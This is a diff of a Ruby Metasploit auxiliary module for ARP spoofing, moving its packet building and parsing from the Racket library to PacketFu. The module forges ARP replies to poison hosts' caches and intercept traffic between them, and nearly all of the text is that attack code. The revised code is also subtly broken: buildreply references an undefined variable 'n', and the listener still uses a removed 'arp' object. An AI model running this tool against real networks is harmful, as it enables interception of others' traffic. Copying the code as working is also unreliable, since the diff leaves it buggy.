@@ -10,13 +10,11 @@
 ##
 
 require 'msf/core'
-require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::Capture
 	include Msf::Auxiliary::Report
-	#include Msf::Auxiliary::Scanner
 
 	def initialize
 		super(
@@ -115,7 +113,7 @@ class Metasploit3 < Msf::Auxiliary
 				GC.start()
 			end
 
-			if capture and  @spoofing and not datastore['BROADCAST']
+			if capture and @spoofing and not datastore['BROADCAST']
 				print_status("RE-ARPing the victims...")
 				3.times do 					
 					@dsthosts_cache.keys.sort.each do |dhost|
@@ -190,12 +188,12 @@ class Metasploit3 < Msf::Auxiliary
 			probe = buildprobe(@sip, lsmac, dhost)
 			capture.inject(probe)
 			while(reply = getreply())
-				next if not reply[:arp]
+				next if not reply.is_arp?
 				#Without this check any arp request would be added to the cache
-				if @dhosts.include? reply[:arp].spa
-					print_status("#{reply[:arp].spa} appears to be up.") 
-					report_host(:host => reply[:arp].spa, :mac=>reply[:arp].sha)
-					@dsthosts_cache[reply[:arp].spa] = reply[:arp].sha
+				if @dhosts.include? reply.arp_saddr_ip
+					print_status("#{reply.arp_saddr_ip} appears to be up.") 
+					report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)
+					@dsthosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac
 				end
 			end
 			
@@ -204,11 +202,11 @@ class Metasploit3 < Msf::Auxiliary
 		etime = Time.now.to_f + datastore['TIMEOUT']
 		while (Time.now.to_f < etime)
 			while(reply = getreply())
-				next if not reply[:arp]
-				if @dhosts.include? reply[:arp].spa
-					print_status("#{reply[:arp].spa} appears to be up.")  
-					report_host(:host => reply[:arp].spa, :mac=>reply[:arp].sha)
-					@dsthosts_cache[reply[:arp].spa] = reply[:arp].sha
+				next if not reply.is_arp?
+				if @dhosts.include? reply.arp_saddr_ip
+					print_status("#{reply.arp_saddr_ip} appears to be up.") 
+					report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)
+					@dsthosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac
 				end
 			end
 			Kernel.select(nil, nil, nil, 0.50)
@@ -232,24 +230,24 @@ class Metasploit3 < Msf::Auxiliary
 				probe = buildprobe(@sip, lsmac, shost)
 				capture.inject(probe)
 				while(reply = getreply())
-					next if not reply[:arp]
-					if @shosts.include? reply[:arp].spa
-						print_status("#{reply[:arp].spa} appears to be up.") 
-						report_host(:host => reply[:arp].spa, :mac=>reply[:arp].sha)
-						@srchosts_cache[reply[:arp].spa] = reply[:arp].sha
+					next if not reply.is_arp?
+					if @shosts.include? reply.arp_saddr_ip
+						print_status("#{reply.arp_saddr_ip} appears to be up.") 
+						report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)
+						@srchosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac
 					end
 				end
-			
+
 			end
 			#Wait some few seconds for last packets
 			etime = Time.now.to_f + datastore['TIMEOUT']
 			while (Time.now.to_f < etime)
 				while(reply = getreply())
-					next if not reply[:arp]
-					if @shosts.include? reply[:arp].spa
-						print_status("#{reply[:arp].spa} appears to be up.")  
-						report_host(:host => reply[:arp].spa, :mac=>reply[:arp].sha)
-						@srchosts_cache[reply[:arp].spa] = reply[:arp].sha
+					next if not reply.is_arp?
+					if @shosts.include? reply.arp_saddr_ip
+						print_status("#{reply.arp_saddr_ip} appears to be up.") 
+						report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)
+						@srchosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac
 					end
 				end
 				Kernel.select(nil, nil, nil, 0.50)
@@ -336,48 +334,36 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def buildprobe(shost, smac, dhost)
-		n = Racket::Racket.new
-		n.l2 = Racket::L2::Ethernet.new(Racket::Misc.randstring(14))
-		n.l2.src_mac = smac
-		n.l2.dst_mac = 'ff:ff:ff:ff:ff:ff'
-		n.l2.ethertype = 0x0806
-
-		n.l3 = Racket::L3::ARP.new
-		n.l3.opcode = Racket::L3::ARP::ARPOP_REQUEST
-		n.l3.sha = n.l2.src_mac
-		n.l3.tha = n.l2.dst_mac
-		n.l3.spa = shost
-		n.l3.tpa = dhost
-		n.pack
+		p = PacketFu::ARPPacket.new
+		p.eth_saddr = smac
+		p.eth_daddr = "ff:ff:ff:ff:ff:ff"
+		p.arp_opcode = 1
+		p.arp_daddr_mac = p.eth_daddr
+		p.arp_saddr_mac = p.eth_saddr
+		p.arp_saddr_ip = shost
+		p.arp_daddr_ip = dhost
+		p
 	end
 
 	def buildreply(shost, smac, dhost, dmac)
-		n = Racket::Racket.new
-		n.l2 = Racket::L2::Ethernet.new(Racket::Misc.randstring(14))
-		n.l2.src_mac = smac
-		n.l2.dst_mac = dmac
-		n.l2.ethertype = 0x0806
-
-		n.l3 = Racket::L3::ARP.new
-		n.l3.opcode = Racket::L3::ARP::ARPOP_REPLY
-		n.l3.sha = n.l2.src_mac
-		n.l3.tha = n.l2.dst_mac
-		n.l3.spa = shost
-		n.l3.tpa = dhost
-		n.pack
+		p = PacketFu::ARPPacket.new
+		n.eth_saddr = smac
+		n.eth_daddr = dmac
+		p.arp_opcode = 2 # ARP Reply
+		p.arp_daddr_mac = p.eth_daddr
+		p.arp_saddr_mac = p.eth_saddr
+		p.arp_saddr_ip = shost
+		p.arp_daddr_ip = dhost
+		p
 	end
 
 	def getreply
-		pkt = capture.next
-		return if not pkt
-
-		eth = Racket::L2::Ethernet.new(pkt)
-		return if not eth.ethertype == 0x0806
-
-		arp = Racket::L3::ARP.new(eth.payload)
-		return if not arp.opcode == Racket::L3::ARP::ARPOP_REPLY
-
-		{:raw => pkt, :eth => eth, :arp => arp}
+		pkt_bytes = capture.next
+		return if not pkt_bytes
+		pkt = PacketFu::Packet.parse(pkt_bytes)
+		return unless pkt.is_arp?
+		return unless pkt.arp_opcode == 2
+		pkt
 	end
 	
 	def start_listener(dsthosts_cache, srchosts_cache)
@@ -390,8 +376,7 @@ class Metasploit3 < Msf::Auxiliary
 		# To avoid any race condition in case of , even if actually those are never updated after the thread is launched
 		args[:AUTO_ADD] = datastore['AUTO_ADD']
 		args[:localip] = @sip.dup
-		@listener = 	
-		Thread.new(args) do |args|
+		@listener = Thread.new(args) do |args|
 			begin
 				#one more local copy 
 				liste_src_ips = []
@@ -407,32 +392,31 @@ class Metasploit3 < Msf::Auxiliary
 				listener_capture = ::Pcap.open_live(@interface, 68, true, 0)
 				listener_capture.setfilter("arp[6:2] == 0x0001")
 				while(true)
-					pkt = listener_capture.next
-					if pkt
-						eth = Racket::L2::Ethernet.new(pkt)
-						if eth.ethertype == 0x0806
-							arp = Racket::L3::ARP.new(eth.payload)
-							if arp.opcode == Racket::L3::ARP::ARPOP_REQUEST
+					pkt_bytes = listener_capture.next
+					if pkt_bytes
+						pkt = PacketFu::Packet.parse(pkt_bytes)
+						if pkt.is_arp?
+							if pkt.arp_opcode == 1
 								#check if the source ip is in the dest hosts
-								if (liste_dst_ips.include? arp.spa and liste_src_ips.include? arp.tpa) or
-								   (args[:BIDIRECTIONAL] and liste_dst_ips.include? arp.tpa and liste_src_ips.include? arp.spa)
-									print_status("Listener : Request from #{arp.spa} for #{arp.tpa}") if datastore['VERBOSE']
+								if (liste_dst_ips.include? pkt.arp_saddr_ip and liste_src_ips.include? pkt.arp_daddr_ip) or
+								   (args[:BIDIRECTIONAL] and liste_dst_ips.include? pkt.arp_daddr_ip and liste_src_ips.include? pkt.arp_saddr_ip)
+									print_status("Listener : Request from #{pkt.arp_saddr_ip} for #{pkt.arp_daddr_ip}") if datastore['VERBOSE']
 									reply = buildreply(arp.tpa, @smac, arp.spa, arp.sha)
 									3.times{listener_capture.inject(reply)}
 								elsif args[:AUTO_ADD]
-									if (@dhosts.include? arp.spa and not liste_dst_ips.include? arp.spa and 
-									    arp.spa != localip)
+									if (@dhosts.include? pkt.arp_saddr_ip and not liste_dst_ips.include? pkt.arp_saddr_ip and 
+									    pkt.arp_saddr_ip != localip)
 										@mutex_cache.lock
-										print_status("#{arp.spa} appears to be up.") 
-										@dsthosts_autoadd_cache[arp.spa] = arp.sha
-										liste_dst_ips.push arp.spa
+										print_status("#{pkt.arp_saddr_ip} appears to be up.") 
+										@dsthosts_autoadd_cache[pkt.arp_saddr_ip] = pkt.arp_saddr_mac 
+										liste_dst_ips.push pkt.arp_saddr_ip
 										@mutex_cache.unlock
-									elsif (args[:BIDIRECTIONAL] and @shosts.include? arp.spa and 
-										not liste_src_ips.include? arp.spa and arp.spa != localip)
+									elsif (args[:BIDIRECTIONAL] and @shosts.include? pkt.arp_saddr_ip and 
+										not liste_src_ips.include? pkt.arp_saddr_ip and pkt.arp_saddr_ip != localip)
 										@mutex_cache.lock
-										print_status("#{arp.spa} appears to be up.") 
-										@srchosts_autoadd_cache[arp.spa] = arp.sha
-										liste_src_ips.push arp.spa
+										print_status("#{pkt.arp_saddr_ip} appears to be up.") 
+										@srchosts_autoadd_cache[pkt.arp_saddr_ip] = pkt.arp_saddr_mac
+										liste_src_ips.push pkt.arp_saddr_ip
 										@mutex_cache.unlock
 									end			
 								end
